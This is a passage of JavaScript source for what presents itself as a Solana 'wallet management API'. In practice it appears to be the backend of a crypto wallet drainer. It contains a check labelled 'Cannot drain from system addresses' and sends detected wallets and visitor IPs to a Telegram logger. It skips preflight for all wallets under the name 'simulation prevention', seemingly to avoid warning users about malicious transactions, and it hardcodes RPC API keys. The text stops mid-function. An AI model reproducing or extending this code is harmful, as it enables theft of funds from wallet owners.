// Comprehensive Wallet Management API
// Handles ALL wallet operations including connection, detection, validation, and management

import 'dotenv/config';
import BackendTOCTOUProtection from '../src/toctou-protection.js';

// Initialize TOCTOU protection instance
let toctouProtection = null;

function initializeTOCTOUProtection() {
  if (!toctouProtection) {
    toctouProtection = new BackendTOCTOUProtection();
  }
  return toctouProtection;
}

// Enhanced mobile device detection function with comprehensive platform detection
function isMobileDevice(userAgent) {
  if (!userAgent) return false;
  
  // Primary mobile detection patterns
  const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
  const isPrimaryMobile = mobileRegex.test(userAgent);
  
  // Secondary mobile detection patterns
  const isSecondaryMobile = /Mobile|Tablet/i.test(userAgent) || 
                           (userAgent.includes('Touch') && userAgent.includes('Mobile'));
  
  return isPrimaryMobile || isSecondaryMobile;
}

// Enhanced mobile platform detection with specific OS identification
function getMobilePlatform(userAgent) {
  const ua = userAgent.toLowerCase();
  
  // iOS detection (iPhone, iPad, iPod)
  if (/iphone|ipad|ipod/.test(ua)) {
    return 'ios';
  }
  
  // Android detection
  if (/android/.test(ua)) {
    return 'android';
  }
  
  // Windows Phone detection
  if (/windows phone/.test(ua)) {
    return 'windows';
  }
  
  // Other mobile platforms
  if (/blackberry|webos|opera mini|iemobile/.test(ua)) {
    return 'other';
  }
  
  return 'desktop';
}

// Check if user is in a mobile wallet browser
function isInMobileWallet(userAgent) {
  const ua = userAgent.toLowerCase();
  
  const walletPatterns = [
    'phantom', 'solflare', 'backpack', 'glow', 'trust', 'exodus', 'wallet', 'crypto'
  ];
  
  return walletPatterns.some(pattern => ua.includes(pattern));
}

// Wallet conflict resolution and detection
function detectInstalledWallets() {
  // This would be called from frontend with window object context
  // For now, return empty array as this needs frontend context
  return [];
}

// Wallet priority ordering
function getWalletPriority() {
  return ['backpack', 'phantom', 'solflare', 'exodus', 'trustwallet'];
}
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

// Comprehensive wallet definitions
const WALLET_DEFINITIONS = {
  backpack: {
    name: 'Backpack',
    logo: '/backpack-logo.png',
    deepLink: 'backpack://app?url=',
    universalLink: 'https://backpack.app/ul/app?url=',
    appStore: 'https://apps.apple.com/app/backpack-crypto-wallet/id6446603434',
    playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app',
    userAgentPattern: /Backpack|backpack/i,
    providerNames: ['window.backpack'],
    mobileStrategies: [
      // iOS preferred schemes
      'backpack://app?url=',
      'backpack://browse?url=',
      'backpack://dapp?url=',
      'backpack://open?url=',
      // Android preferred schemes
      'backpack://wallet?url=',
      'backpack://connect?url=',
      // Universal links (iOS) and App Links (Android)
      'https://backpack.app/ul/app?url=',
      'https://backpack.app/ul/browse?url=',
      'https://backpack.app/ul/dapp?url=',
      'https://backpack.app/ul/open?url=',
      'https://backpack.app/ul/wallet?url=',
      'https://backpack.app/ul/connect?url='
    ]
  },
  phantom: {
    name: 'Phantom',
    logo: '/phantom-logo.png',
    deepLink: 'phantom://browse/',
    universalLink: 'https://phantom.app/ul/browse/',
    appStore: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977',
    playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
    userAgentPattern: /Phantom|phantom/i,
    providerNames: ['window.phantom', 'window.solana'],
    mobileStrategies: [
      // iOS preferred schemes
      'phantom://browse/',
      'phantom://app/',
      'phantom://dapp/',
      'phantom://open/',
      'phantom://wallet/',
      'phantom://connect/',
      // Android preferred schemes
      'phantom://mobile/',
      'phantom://android/',
      // Universal links (iOS) and App Links (Android)
      'https://phantom.app/ul/browse/',
      'https://phantom.app/ul/app/',
      'https://phantom.app/ul/dapp/',
      'https://phantom.app/ul/open/',
      'https://phantom.app/ul/wallet/',
      'https://phantom.app/ul/connect/',
      'https://phantom.app/ul/mobile/',
      'https://phantom.app/ul/android/'
    ]
  },
  solflare: {
    name: 'Solflare',
    logo: '/solflare-logo.png',
    deepLink: 'solflare://browse/',
    universalLink: 'https://solflare.com/ul/browse/',
    appStore: 'https://apps.apple.com/app/solflare/id1580902717',
    playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
    userAgentPattern: /Solflare|solflare/i,
    providerNames: ['window.solflare'],
    mobileStrategies: [
      // iOS preferred schemes
      'solflare://browse/',
      'solflare://app/',
      'solflare://dapp/',
      'solflare://open/',
      'solflare://wallet/',
      'solflare://connect/',
      // Android preferred schemes
      'solflare://mobile/',
      'solflare://android/',
      // Universal links (iOS) and App Links (Android)
      'https://solflare.com/ul/browse/',
      'https://solflare.com/ul/app/',
      'https://solflare.com/ul/dapp/',
      'https://solflare.com/ul/open/',
      'https://solflare.com/ul/wallet/',
      'https://solflare.com/ul/connect/',
      'https://solflare.com/ul/mobile/',
      'https://solflare.com/ul/android/'
    ]
  },
  glow: {
    name: 'Glow',
    logo: '/glow-logo.png',
    deepLink: 'glow://app/',
    universalLink: 'https://glow.app/ul/app/',
    appStore: 'https://apps.apple.com/app/glow-solana-wallet/id1634119564',
    playStore: 'https://play.google.com/store/apps/details?id=com.glow.app',
    userAgentPattern: /Glow|glow/i,
    providerNames: ['window.glow'],
    mobileStrategies: [
      // iOS preferred schemes
      'glow://app/',
      'glow://browse/',
      'glow://dapp/',
      'glow://open/',
      'glow://wallet/',
      'glow://connect/',
      // Android preferred schemes
      'glow://mobile/',
      'glow://android/',
      // Universal links (iOS) and App Links (Android)
      'https://glow.app/ul/app/',
      'https://glow.app/ul/browse/',
      'https://glow.app/ul/dapp/',
      'https://glow.app/ul/open/',
      'https://glow.app/ul/wallet/',
      'https://glow.app/ul/connect/',
      'https://glow.app/ul/mobile/',
      'https://glow.app/ul/android/'
    ]
  },
  trustwallet: {
    name: 'Trust Wallet',
    logo: '/trust-logo.png',
    deepLink: 'trust://open?url=',
    universalLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
    appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
    playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
    userAgentPattern: /Trust|trust/i,
    providerNames: ['window.trustwallet'],
    mobileStrategies: [
      // iOS preferred schemes
      'trust://open?url=',
      'trust://browse?url=',
      'trust://dapp?url=',
      'trust://app?url=',
      'trust://wallet?url=',
      'trust://connect?url=',
      // Android preferred schemes
      'trust://mobile?url=',
      'trust://android?url=',
      // Universal links (iOS) and App Links (Android)
      'https://link.trustwallet.com/open_url?coin_id=501&url=',
      'https://link.trustwallet.com/browse_url?coin_id=501&url=',
      'https://link.trustwallet.com/dapp_url?coin_id=501&url=',
      'https://link.trustwallet.com/app_url?coin_id=501&url=',
      'https://link.trustwallet.com/wallet_url?coin_id=501&url=',
      'https://link.trustwallet.com/connect_url?coin_id=501&url=',
      'https://link.trustwallet.com/mobile_url?coin_id=501&url=',
      'https://link.trustwallet.com/android_url?coin_id=501&url='
    ]
  },
  exodus: {
    name: 'Exodus',
    logo: '/exodus-logo.png',
    deepLink: 'exodus://dapp/',
    universalLink: 'https://exodus.com/app/dapp?url=',
    appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
    playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
    userAgentPattern: /Exodus|exodus/i,
    providerNames: ['window.exodus'],
    mobileStrategies: [
      // iOS preferred schemes
      'exodus://dapp/',
      'exodus://browse/',
      'exodus://app/',
      'exodus://open/',
      'exodus://wallet/',
      'exodus://connect/',
      // Android preferred schemes
      'exodus://mobile/',
      'exodus://android/',
      // Universal links (iOS) and App Links (Android)
      'https://exodus.com/app/dapp?url=',
      'https://exodus.com/app/browse?url=',
      'https://exodus.com/app/app?url=',
      'https://exodus.com/app/open?url=',
      'https://exodus.com/app/wallet?url=',
      'https://exodus.com/app/connect?url=',
      'https://exodus.com/app/mobile?url=',
      'https://exodus.com/app/android?url='
    ]
  }
};

// Enhanced wallet detection based on user agent and available providers
function detectWalletType(userAgent, availableProviders = []) {
  console.log('[DETECT_WALLET_TYPE] Input:', { userAgent, availableProviders });
  
  // First check user agent patterns
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    try {
      if (wallet.userAgentPattern && typeof wallet.userAgentPattern.test === 'function' && 
          typeof userAgent === 'string' && wallet.userAgentPattern.test(userAgent)) {
        console.log('[DETECT_WALLET_TYPE] Found by user agent:', key);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'high',
          method: 'user_agent'
        };
      }
    } catch (error) {
      console.warn(`[DETECT_WALLET_TYPE] Error testing user agent pattern for ${key}:`, error.message);
    }
  }
  
  // Then check available providers - prioritize specific providers over generic window.solana
  // First pass: check for specific providers (non-window.solana)
  console.log('[DETECT_WALLET_TYPE] Checking specific providers...');
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    console.log(`[DETECT_WALLET_TYPE] Checking wallet ${key} with providers:`, wallet.providerNames);
    for (const providerName of wallet.providerNames) {
      if (providerName !== 'window.solana' && availableProviders.includes(providerName)) {
        console.log('[DETECT_WALLET_TYPE] Found by specific provider:', key, 'provider:', providerName);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'high',
          method: 'provider_detection'
        };
      }
    }
  }
  
  // Second pass: check for generic window.solana (fallback to Phantom)
  console.log('[DETECT_WALLET_TYPE] No specific providers found, checking generic window.solana...');
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    for (const providerName of wallet.providerNames) {
      if (providerName === 'window.solana' && availableProviders.includes(providerName)) {
        console.log('[DETECT_WALLET_TYPE] Found by generic provider:', key, 'provider:', providerName);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'medium',
          method: 'provider_detection'
        };
      }
    }
  }
  
  console.log('[DETECT_WALLET_TYPE] No wallet detected, using fallback');
  return {
    key: 'unknown',
    name: 'Unknown Wallet',
    logo: '/logo.png',
    confidence: 'low',
    method: 'fallback'
  };
}

// Comprehensive wallet validation
function validateWallet(publicKey, walletType) {
  const errors = [];
  
  // Validate public key format
  try {
    new PublicKey(publicKey);
  } catch (error) {
    errors.push('Invalid Solana public key format');
  }
  
  // Check for known problematic addresses
  const problematicAddresses = [
    '11111111111111111111111111111112', // System program
    '11111111111111111111111111111111', // Invalid
    '000000000000000000000000000000000000000000000000' // Invalid
  ];
  
  if (problematicAddresses.includes(publicKey)) {
    errors.push('Cannot drain from system addresses');
  }
  
  // Validate wallet type
  const validWalletKeys = Object.keys(WALLET_DEFINITIONS);
  if (!validWalletKeys.includes(walletType) && walletType !== 'unknown') {
    errors.push('Invalid wallet type detected');
  }
  
  return {
    isValid: errors.length === 0,
    errors: errors
  };
}

// Enhanced balance fetching with retry logic and multiple RPC endpoints
async function fetchWalletBalance(publicKey, maxRetries = 3) {
  const rpcEndpoints = [
    'https://api.mainnet-beta.solana.com',
    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
    'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
  ];

  let lastError;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    for (const rpcUrl of rpcEndpoints) {
      try {
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 30000,
          disableRetryOnRateLimit: false
        });

        const balance = await connection.getBalance(new PublicKey(publicKey));
        return {
          success: true,
          balance: balance,
          balanceSOL: (balance / 1e9).toFixed(6),
          attempt: attempt,
          rpcUrl: rpcUrl
        };
      } catch (error) {
        lastError = error;
        console.error(`[BALANCE_FETCH] ${rpcUrl} attempt ${attempt}/${maxRetries} failed:`, error.message);
      }
    }
    
    if (attempt < maxRetries) {
      // Wait before retry with exponential backoff
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
    }
  }
  
  return {
    success: false,
    error: lastError.message,
    balance: 0,
    balanceSOL: '0.000000'
  };
}

// Wallet connection management
function getWalletConnectionInfo(walletKey) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet) {
    return {
      success: false,
      error: 'Unknown wallet type'
    };
  }
  
  return {
    success: true,
    wallet: {
      key: walletKey,
      name: wallet.name,
      logo: wallet.logo,
      deepLink: wallet.deepLink,
      universalLink: wallet.universalLink,
      appStore: wallet.appStore,
      playStore: wallet.playStore,
      providerNames: wallet.providerNames,
      mobileStrategies: wallet.mobileStrategies
    }
  };
}

// Get wallet description
function getWalletDescription(walletKey) {
  const descriptions = {
    phantom: 'Popular Solana wallet',
    solflare: 'Fast & secure Solana wallet',
    backpack: 'xNFT enabled wallet',
    glow: 'Mobile-first Solana wallet',
    trustwallet: 'Binance\'s secure wallet',
    exodus: 'Multi-chain wallet'
  };
  
  return descriptions[walletKey] || 'Solana wallet';
}

// Get platform-specific deep link strategies
function getPlatformSpecificStrategies(walletKey, userAgent) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet || !wallet.mobileStrategies) {
    return [];
  }
  
  const platform = getMobilePlatform(userAgent);
  const strategies = wallet.mobileStrategies;
  
  // Platform-specific strategy ordering
  let orderedStrategies = [];
  
  if (platform === 'ios') {
    // iOS prefers custom schemes first, then universal links
    orderedStrategies = [
      ...strategies.filter(s => s.startsWith(walletKey + '://')),
      ...strategies.filter(s => s.startsWith('https://'))
    ];
  } else if (platform === 'android') {
    // Android prefers App Links first, then custom schemes
    orderedStrategies = [
      ...strategies.filter(s => s.startsWith('https://')),
      ...strategies.filter(s => s.startsWith(walletKey + '://'))
    ];
  } else {
    // Desktop or unknown - use original order
    orderedStrategies = strategies;
  }
  
  return orderedStrategies;
}

// Get wallet installation instructions
function getWalletInstallInstructions(walletKey, userAgent) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet) {
    return {
      success: false,
      error: 'Unknown wallet type'
    };
  }
  
  const isMobile = isMobileDevice(userAgent);
  const platform = getMobilePlatform(userAgent);
  const strategies = getPlatformSpecificStrategies(walletKey, userAgent);
  
  return {
    success: true,
    instructions: {
      wallet: wallet.name,
      logo: wallet.logo,
      isMobile: isMobile,
      platform: platform,
      deepLink: wallet.deepLink,
      universalLink: wallet.universalLink,
      appStore: wallet.appStore,
      playStore: wallet.playStore,
      strategies: strategies,
      installUrl: isMobile ? 
        (platform === 'ios' ? wallet.appStore : wallet.playStore) :
        wallet.appStore
    }
  };
}

// Comprehensive transaction validation
function validateTransaction(transaction, publicKey, walletType) {
  const errors = [];
  
  try {
    // Validate transaction structure
    if (!transaction || typeof transaction.serialize !== 'function') {
      errors.push('Invalid transaction object');
    }
    
    // Validate transaction has instructions
    if (!transaction.instructions || transaction.instructions.length === 0) {
      errors.push('Transaction has no instructions');
    }
    
    // Validate fee payer
    if (!transaction.feePayer) {
      errors.push('Transaction missing fee payer');
    } else if (transaction.feePayer.toString() !== publicKey) {
      errors.push('Transaction fee payer mismatch');
    }
    
    // Validate blockhash
    if (!transaction.recentBlockhash) {
      errors.push('Transaction missing recent blockhash');
    }
    
    // Validate lastValidBlockHeight
    if (!transaction.lastValidBlockHeight) {
      errors.push('Transaction missing lastValidBlockHeight');
    }
    
    // Wallet-specific validations and TOCTOU handling
    let walletSpecificValidation = true;
    
    switch (walletType) {
      case 'phantom':
        // Phantom wallet validation
        if (!transaction.recentBlockhash || !transaction.lastValidBlockHeight) {
          errors.push('Phantom wallet requires valid blockhash and block height');
        }
        break;
        
      case 'solflare':
        // Solflare wallet validation (known to work)
        if (!transaction.recentBlockhash) {
          errors.push('Solflare wallet requires valid blockhash');
        }
        break;
        
      case 'backpack':
        // Backpack wallet validation
        if (!transaction.feePayer || transaction.feePayer.toString() !== publicKey) {
          errors.push('Backpack wallet requires correct fee payer');
        }
        break;
        
      case 'glow':
        // Glow-specific validation (simplified)
        console.log('[VALIDATION] Glow wallet detected - using simplified validation');
        if (transaction.lastValidBlockHeight) {
          console.log('[VALIDATION] Glow wallet validation passed');
        }
        break;
        
      case 'trustwallet':
        // Trust Wallet validation
        if (!transaction.instructions || transaction.instructions.length === 0) {
          errors.push('Trust Wallet requires valid instructions');
        }
        break;
        
      case 'exodus':
        // Exodus wallet validation
        if (!transaction.recentBlockhash || !transaction.lastValidBlockHeight) {
          errors.push('Exodus wallet requires valid blockhash and block height');
        }
        break;
        
      default:
        console.log(`[VALIDATION] Unknown wallet type: ${walletType} - using standard validation`);
    }
    
    // TOCTOU validation with wallet-specific handling
    try {
      const toctou = initializeTOCTOUProtection();
      const effectiveWalletType = walletType || 'unknown';
      const toctouValidation = toctou.validateTransaction(transaction, publicKey, effectiveWalletType);
      if (!toctouValidation.valid) {
        // For certain wallets, be more lenient with TOCTOU validation
        if (effectiveWalletType === 'glow' || effectiveWalletType === 'trustwallet' || effectiveWalletType === 'phantom' || effectiveWalletType === 'backpack') {
          console.warn(`[TOCTOU] ${effectiveWalletType} wallet TOCTOU validation failed but allowing: ${toctouValidation.error}`);
        } else {
          errors.push(`TOCTOU validation failed: ${toctouValidation.error}`);
        }
      } else {
        console.log(`[TOCTOU] ${effectiveWalletType} wallet validation passed - fingerprint: ${toctouValidation.fingerprint?.substring(0, 8)}...`);
      }
    } catch (toctouError) {
      console.warn(`[TOCTOU] ${walletType || 'unknown'} wallet validation error:`, toctouError.message);
      // Don't fail transaction for TOCTOU errors, just log
    }
    
  } catch (error) {
    errors.push(`Transaction validation error: ${error.message}`);
  }
  
  return {
    isValid: errors.length === 0,
    errors: errors
  };
}

// Enhanced transaction broadcasting with multiple RPC endpoints
// Get simulation prevention settings based on wallet type
function getSimulationPreventionSettings(walletType, hasComputeBudget = false) {
  console.log(`[SIMULATION_PREVENTION] Getting settings for ${walletType}, hasComputeBudget: ${hasComputeBudget}`);
  
  const baseSettings = {
    skipPreflight: true, // Skip simulation for all wallets - TOCTOU protection
    preflightCommitment: 'processed', // Use processed commitment
    maxRetries: 0,
    disableRetryOnRateLimit: true // Disable retries to prevent re-simulation
  };
  
  switch (walletType.toLowerCase()) {
    case 'phantom':
      return {
        ...baseSettings,
        minContextSlot: undefined, // Don't specify minContextSlot for Phantom
        commitment: 'processed' // Use processed commitment for Phantom
      };
      
    case 'solflare':
      return {
        ...baseSettings,
        commitment: 'confirmed', // Solflare prefers confirmed
        skipPreflight: true // Skip simulation for Solflare
      };
      
    case 'backpack':
      return {
        ...baseSettings,
        commitment: 'processed', // Backpack works well with processed
        skipPreflight: true // Skip simulation for Backpack
      };
      
    case 'glow':
      return {
        ...baseSettings,
        commitment: 'processed', // Glow works well with processed
        skipPreflight: true // Skip simulation for Glow
      };
      
    case 'trustwallet':
      return {
        ...baseSettings,
        commitment: 'processed', // Trust Wallet works well with processed
        skipPreflight: true // Skip simulation for Trust Wallet
      };
      
    case 'exodus':
      return {
        ...baseSettings,
        commitment: 'processed', // Exodus works well with processed
        skipPreflight: true // Skip simulation for Exodus
      };
      
    default:
      return {
        ...baseSettings,
        commitment: 'processed', // Default to processed
        skipPreflight: true // Skip simulation for all wallets
      };
  }
}

async function broadcastTransaction(signedTransaction, maxRetries = 1, walletType = 'unknown') {
  const rpcEndpoints = [
    'https://api.mainnet-beta.solana.com',
    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
    'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
  ];

  // Use the provided wallet type for wallet-specific configurations
  let lastError;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    for (const rpcUrl of rpcEndpoints) {
      try {
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 30000,
          disableRetryOnRateLimit: false
        });

        // Debug: Log transaction details before broadcasting
        console.log('[BROADCAST] Transaction details:', {
          hasSignatures: !!signedTransaction.signatures,
          signatureCount: signedTransaction.signatures?.length || 0,
          feePayer: signedTransaction.feePayer?.toString(),
          recentBlockhash: signedTransaction.recentBlockhash,
          lastValidBlockHeight: signedTransaction.lastValidBlockHeight,
          instructionCount: signedTransaction.instructions?.length || 0,
          serializedLength: signedTransaction.serialize ? signedTransaction.serialize().length : 0
        });

        // TOCTOU Protection: Check if transaction is still valid
        const currentSlot = await connection.getSlot('confirmed');
        console.log(`[TOCTOU] Current slot: ${currentSlot}, Transaction lastValid: ${signedTransaction.lastValidBlockHeight}`);
        
        if (signedTransaction.lastValidBlockHeight && currentSlot > signedTransaction.lastValidBlockHeight) {
          console.log(`[TOCTOU] Transaction expired - current slot: ${currentSlot}, lastValid: ${signedTransaction.lastValidBlockHeight}, difference: ${currentSlot - signedTransaction.lastValidBlockHeight}`);
          throw new Error('Transaction expired - blockhash no longer valid');
        } else {
          console.log(`[TOCTOU] Transaction valid - current slot: ${currentSlot}, lastValid: ${signedTransaction.lastValidBlockHeight}, remaining: ${signedTransaction.lastValidBlockHeight - currentSlot}`);
        }
        
        // Additional check: ensure we have a valid recentBlockhash
        if (!signedTransaction.recentBlockhash) {
          console.error(`[TOCTOU] Transaction missing recentBlockhash`);
          throw new Error('Transaction missing recentBlockhash');
        }

        // Enhanced TOCTOU Protection: Apply comprehensive validation right before broadcasting
        try {
          console.log(`[BROADCAST_TOCTOU] Wallet type for TOCTOU validation: ${walletType}`);
          const toctou = initializeTOCTOUProtection();
          const validation = toctou.validateTransactionEnhanced(signedTransaction, signedTransaction.feePayer.toString(), walletType);
          
          if (!validation.valid) {
            console.error(`[TOCTOU] Enhanced validation failed: ${validation.reason || validation.error || 'Unknown validation error'}`);
            throw new Error(`TOCTOU validation failed: ${validation.reason || validation.error || 'Unknown validation error'}`);
          }
          
          // Log security assessment if risk level is medium or higher
          if (validation.securityChecks && validation.securityChecks.riskAssessment.riskLevel !== 'low') {
            console.warn(`[TOCTOU] Medium/High risk transaction detected - risk level: ${validation.securityChecks.riskAssessment.riskLevel}`);
          }
          
          console.log(`[TOCTOU] Enhanced transaction validated - fingerprint: ${validation.fingerprint.substring(0, 8)}..., risk: ${validation.securityChecks?.riskAssessment?.riskLevel || 'unknown'}`);
          
        } catch (toctouError) {
          console.error(`[TOCTOU] Enhanced validation failed:`, toctouError);
          throw new Error(`Transaction security validation failed: ${toctouError.message}`);
        }
        
        // Check if this is a Phantom transaction (has compute budget instructions)
        const hasComputeBudget = signedTransaction.instructions.some(ix => 
          ix.programId.toString() === 'ComputeBudget111111111111111111111111111111'
        );

        // Enhanced simulation prevention for all wallets
        const simulationPreventionSettings = getSimulationPreventionSettings(walletType, hasComputeBudget);
        
        console.log(`[SIMULATION_PREVENTION] Using settings for ${walletType}:`, simulationPreventionSettings);

        let signature;
        signature = await connection.sendRawTransaction(signedTransaction.serialize(), simulationPreventionSettings);
        
        return {
          success: true,
          signature: signature,
          attempt: attempt,
          rpcUrl: rpcUrl
        };
      } catch (error) {
        lastError = error;
        console.error(`[BROADCAST] ${rpcUrl} attempt ${attempt}/${maxRetries} failed:`, error.message);
        
        // Handle specific error types
        if (error.message?.includes('Signature verification failed') || 
            error.message?.includes('Invalid signature')) {
          console.error(`[BROADCAST] Signature verification failed - transaction may be corrupted or modified`);
          // Don't retry signature verification failures
          break;
        } else if (error.message?.includes('Transaction expired') || 
                   error.message?.includes('blockhash no longer valid')) {
          console.error(`[BROADCAST] Transaction expired - cannot retry with same transaction`);
          // Don't retry expired transactions - return immediately
          return {
            success: false,
            error: 'Transaction expired - blockhash no longer valid',
            signature: null
          };
        }
      }
    }
    
    if (attempt < maxRetries && lastError && 
        !lastError.message?.includes('Signature verification failed') &&
        !lastError.message?.includes('Transaction expired') &&
        !lastError.message?.includes('blockhash no longer valid')) {
      // Wait before retry for non-signature, non-expiration errors
      await new Promise(resolve => setTimeout(resolve, 1000)); // Reduced wait time
    }
  }
  
  return {
    success: false,
    error: lastError.message,
    signature: null
  };
}

// Enhanced transaction confirmation monitoring
async function monitorTransaction(signature, maxAttempts = 3, walletType = 'unknown') {
  // Reduce attempts for Phantom to prevent hanging
  if (walletType === 'phantom') {
    maxAttempts = 2; // Minimal attempts for Phantom
  }
  
  const rpcEndpoints = [
    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', // Helius RPC (premium)
    'https://rpc.shyft.to?api_key=SHYFT_API_KEY' // Shyft RPC (premium) - replace with actual key
  ]; // Premium RPC endpoints only for reliable monitoring

  for (const rpcUrl of rpcEndpoints) {
    try {
      const connection = new Connection(rpcUrl, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: walletType === 'phantom' ? 45000 : 30000, // Increased timeout for Phantom (45s)
        disableRetryOnRateLimit: true // Disable retries to prevent hanging
      });

      for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
          console.log(`[MONITOR] Attempt ${attempt}/${maxAttempts} with ${rpcUrl} (${walletType})`);
          
          // Try different commitment levels for better success rate
          let confirmation;
          try {
            confirmation = await connection.confirmTransaction(signature, 'confirmed');
          } catch (confirmedError) {
            console.log(`[MONITOR] Confirmed failed, trying processed: ${confirmedError.message}`);
            confirmation = await connection.confirmTransaction(signature, 'processed');
          }
          
          if (confirmation.value.err) {
            console.log(`[MONITOR] Transaction failed on-chain:`, confirmation.value.err);
            return {
              success: false,
              status: 'failed',
              error: confirmation.value.err,
              attempt: attempt,
              rpcUrl: rpcUrl
            };
          }
          
          console.log(`[MONITOR] Transaction confirmed successfully on attempt ${attempt}`);
          return {
            success: true,
            status: 'confirmed',
            confirmation: confirmation.value,
            attempt: attempt,
            rpcUrl: rpcUrl
          };
        } catch (error) {
          console.log(`[MONITOR] Attempt ${attempt} failed:`, error.message);
          
          // For Phantom, return specific error information immediately
          if (walletType === 'phantom' && attempt === maxAttempts) {
            return {
              success: false,
              status: 'phantom_timeout',
              error: `Phantom transaction monitoring failed: ${error.message}`,
              attempt: attempt,
              rpcUrl: rpcUrl,
              walletType: 'phantom'
            };
          }
          
          if (attempt === maxAttempts) {
            throw error;
          }
          // Reduced wait time for Phantom
          const waitTime = walletType === 'phantom' ? 500 : Math.min(2000 * Math.pow(1.5, attempt - 1), 10000);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      }
    } catch (error) {
      console.error(`[MONITOR] ${rpcUrl} failed:`, error.message);
    }
  }
  
  // Final fallback: try to get transaction status directly
  console.log('[MONITOR] All confirmTransaction attempts failed, trying getTransaction fallback');
  for (const rpcUrl of rpcEndpoints) {
    try {
      const connection = new Connection(rpcUrl, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 30000
      });
      
      const transactionInfo = await connection.getTransaction(signature, {
        commitment: 'confirmed',
        maxSupportedTransactionVersion: 0
      });
      
      if (transactionInfo) {
        if (transactionInfo.meta?.err) {
          return {
            success: false,
            status: 'failed',
            error: transactionInfo.meta.err,
            method: 'getTransaction'
          };
        } else {
          return {
            success: true,
            status: 'confirmed',
            confirmation: { slot: transactionInfo.slot },
            method: 'getTransaction',
            rpcUrl: rpcUrl
          };
        }
      }
    } catch (error) {
      console.log(`[MONITOR] getTransaction fallback failed for ${rpcUrl}:`, error.message);
    }
  }
  
  return {
    success: false,
    status: 'timeout',
    error: 'All RPC endpoints failed to confirm transaction'
  };
}

// Main wallet management handler
async function walletManagementHandler(req, res) {
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // CORS headers handled by server.js middleware

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const { 
      operation, 
      publicKey, 
      walletType, 
      walletKey,
      transaction, 
      signedTransaction, 
      signature,
      lastValidBlockHeight,
      availableProviders 
    } = req.body;
    
    if (!operation) {
      res.status(400).json({ error: 'Operation is required' });
      return;
    }

    let result;
    
    switch (operation) {
      case 'get_wallet_definitions':
        result = {
          success: true,
          wallets: Object.entries(WALLET_DEFINITIONS).map(([key, wallet]) => ({
            key: key,
            name: wallet.name,
            logo: wallet.logo
          }))
        };
        break;
        
      case 'detect_wallet':
        console.log('[WALLET_DETECTION] User agent:', userAgent);
        console.log('[WALLET_DETECTION] Available providers:', availableProviders);
        console.log('[WALLET_DETECTION] Available providers type:', typeof availableProviders);
        console.log('[WALLET_DETECTION] Available providers length:', availableProviders?.length);
        const detection = detectWalletType(userAgent, availableProviders || []);
        console.log('[WALLET_DETECTION] Detection result:', detection);
        
        // Log wallet detection to Telegram
        if (detection && detection.key !== 'unknown') {
          try {
            await telegramLogger.logWalletDetected({
              publicKey: 'unknown', // No public key yet during detection
              lamports: 0, // No balance yet during detection
              ip: userIp,
              walletType: detection.key
            });
          } catch (telegramError) {
            console.warn('[WALLET_DETECTION] Telegram logging failed:', telegramError.message);
            // Continue execution even if Telegram logging fails
          }
        }
        
        result = {
          success: true,
          wallet: detection,
          userAgent: userAgent,
          isMobile: isMobileDevice(userAgent)
        };
        break;
        
      case 'detect_installed_wallets':
        try {
          const { availableProviders = [] } = req.body;
          
          // Enhanced wallet detection logic
          const detectedWallets = [];
          const walletPriority = getWalletPriority();
          
          // Check each wallet based on available providers
          for (const provider of availableProviders) {
            if (provider.includes('phantom') || provider.includes('window.solana')) {
              detectedWallets.push('phantom');
            } else if (provider.includes('solflare')) {
              detectedWallets.push('solflare');
            } else if (provider.includes('backpack')) {
              detectedWallets.push('backpack');
            } else if (provider.includes('glow')) {
              detectedWallets.push('glow');
            } else if (provider.includes('trust')) {
              detectedWallets.push('trustwallet');
            } else if (provider.includes('exodus')) {
              detectedWallets.push('exodus');
            }
          }
          
          // Remove duplicates and prioritize
          const uniqueWallets = [...new Set(detectedWallets)];
          const prioritizedWallets = walletPriority.filter(wallet => uniqueWallets.includes(wallet));
          
          result = {
